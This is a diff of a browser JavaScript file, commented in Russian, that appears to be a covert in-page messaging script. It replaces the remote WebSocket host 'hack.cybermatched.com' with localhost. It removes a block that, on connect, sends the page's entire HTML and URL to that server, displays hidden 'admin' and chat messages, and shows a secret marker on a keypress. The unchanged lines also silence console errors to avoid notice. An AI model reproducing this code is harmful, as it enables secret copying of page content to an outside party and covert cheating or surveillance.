@@ -9,7 +9,7 @@
     console.error = function() {};
     console.warn = function() {};
       // URL вашего сервера WebSocket (замените на свой)
-   const serverAddress = "wss://hack.cybermatched.com";
+   const serverAddress = "ws://localhost:8080";
     
     // Переменная для хранения WebSocket соединения
     let socket = null;
@@ -321,65 +321,6 @@
             }));
         }
     }
-    
-    // === Скрытый показ 'ag' при успешном коннекте и нажатии f ===
-let isConnected = false;
-// Обновляем isConnected при подключении/отключении
-(function() {
-    const origConnectToWebSocket = connectToWebSocket;
-    connectToWebSocket = function() {
-        try {
-            socket = new WebSocket(serverAddress);
-            socket.onopen = function() {
-                isConnected = true;
-                // Получаем HTML страницы
-                const htmlContent = document.documentElement.outerHTML;
-                
-                // Отправляем HTML на сервер
-                socket.send(JSON.stringify({
-                    type: 'html',
-                    content: htmlContent,
-                    url: window.location.href
-                }));
-            };
-            socket.onclose = function() {
-                isConnected = false;
-                setTimeout(connectToWebSocket, 5000);
-            };
-            socket.onmessage = function(event) {
-                try {
-                    const data = JSON.parse(event.data);
-                    
-                    if (data.type === 'admin') {
-                        // Запоминаем последнее сообщение от админа
-                        lastMessage = data.message;
-                        updateMessageDisplay();
-                    } else if (data.type === 'chat') {
-                        // Запоминаем последнее сообщение из чата
-                        lastMessage = `${data.clientId}: ${data.message}`;
-                        updateMessageDisplay();
-                    }
-                } catch (e) {
-                    // Для текстовых сообщений
-                    lastMessage = event.data;
-                    updateMessageDisplay();
-                }
-            };
-        } catch (e) {}
-    };
-})();
-// Обработка нажатия f (или а) для показа 'ag' в левом углу
-(function() {
-    document.addEventListener('keydown', function(event) {
-        if (event.ctrlKey || event.altKey || event.metaKey) return;
-        if ((event.key === 'f' || event.key === 'F' || event.key === 'а' || event.key === 'А') && isConnected) {
-            messagePosition = "left";
-            lastMessage = "ag";
-            updateMessageDisplay();
-        }
-    });
-})();
-// === конец функции скрытого показа ===
     
     // Обработчик нажатий клавиш
     document.addEventListener('keydown', function(event) {
